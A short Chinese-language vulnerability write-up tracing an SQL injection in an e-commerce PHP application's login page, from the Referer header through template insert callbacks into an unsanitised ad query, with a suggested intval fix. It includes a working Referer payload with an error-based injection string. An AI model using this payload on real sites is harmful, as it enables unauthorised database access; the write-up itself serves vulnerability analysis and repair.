## 说明
- 作者 | Author：阿呆
- 时间 | Date：2018/09/13
- 来源 | Source：

## 代码
- 分类 | Category：SQL inject
- 语言 | Language：PHP

```php
/* 用户登录界面 */
elseif ($action == 'login')
{
    if (empty($back_act))
    {
        if (empty($back_act) && isset($GLOBALS['_SERVER']['HTTP_REFERER']))
        {
            $back_act = strpos($GLOBALS['_SERVER']['HTTP_REFERER'], 'user.php') ? './index.php' : $GLOBALS['_SERVER']['HTTP_REFERER'];
        }
        else
        {
            $back_act = 'user.php';
        }

    }


    $captcha = intval($_CFG['captcha']);
    if (($captcha & CAPTCHA_LOGIN) && (!($captcha & CAPTCHA_LOGIN_FAIL) || (($captcha & CAPTCHA_LOGIN_FAIL) && $_SESSION['login_fail'] > 2)) && gd_version() > 0)
    {
        $GLOBALS['smarty']->assign('enabled_captcha', 1);
        $GLOBALS['smarty']->assign('rand', mt_rand());
    }
    $smarty->assign('back_act', $back_act);
    $smarty->display('user_passport.dwt');    
```
首先满足变量可控。跟进display函数。

```php
   function display($filename, $cache_id = '')
    {

        $this->_seterror++;
        error_reporting(E_ALL ^ E_NOTICE);

        $this->_checkfile = false;
        $out = $this->fetch($filename, $cache_id);
        if (strpos($out, $this->_echash) !== false)
        {
            $k = explode($this->_echash, $out);
            foreach ($k AS $key => $val)
            {
                if (($key % 2) == 1)
                #if($key==3)
                {   
                    $k[$key] = $this->insert_mod($val);
                }
            }
```
首先通过fetch函数读取模板的内容。其次通过$this->_echash进行对模板内容分隔。进入foreach语句，可如果满足if的判断。那么就进入inser_mod函数。继续跟进。

```php
    function insert_mod($name) // 处理动态内容
    {
        
        list($fun, $para) = explode('|', $name);

        $para = unserialize($para);
        $fun = 'insert_' . $fun;
        return $fun($para);
    }
```
发现采用了动态回调。

继续跟进insert_ads函数。

```php
function insert_ads($arr)
{
    static $static_res = NULL;
    $time = gmtime();
    if (!empty($arr['num']) && $arr['num'] != 1)
    {
        $sql  = 'SELECT a.ad_id, a.position_id, a.media_type, a.ad_link, a.ad_code, a.ad_name, p.ad_width, ' .
                    'p.ad_height, p.position_style, RAND() AS rnd ' .
                'FROM ' . $GLOBALS['ecs']->table('ad') . ' AS a '.
                'LEFT JOIN ' . $GLOBALS['ecs']->table('ad_position') . ' AS p ON a.position_id = p.position_id ' .
                "WHERE enabled = 1 AND start_time <= '" . $time . "' AND end_time >= '" . $time . "' ".
                    "AND a.position_id = '" . $arr['id'] . "' " .
                'ORDER BY rnd LIMIT ' . $arr['num'];
        $res = $GLOBALS['db']->GetAll($sql);

    }
```
可以看见，未做处理进拼接进入了sql语句。

漏洞利用:

'Referer':'554fcae493e564ee0dc75bdf2ebf94caads|a:2:{s:3:"num";s:72:"0,1 procedure analyse(extractvalue(rand(),concat(0x7e,version())),1)-- -";s:2:"id";i:1;}'}

##修复

对id跟num做intval处理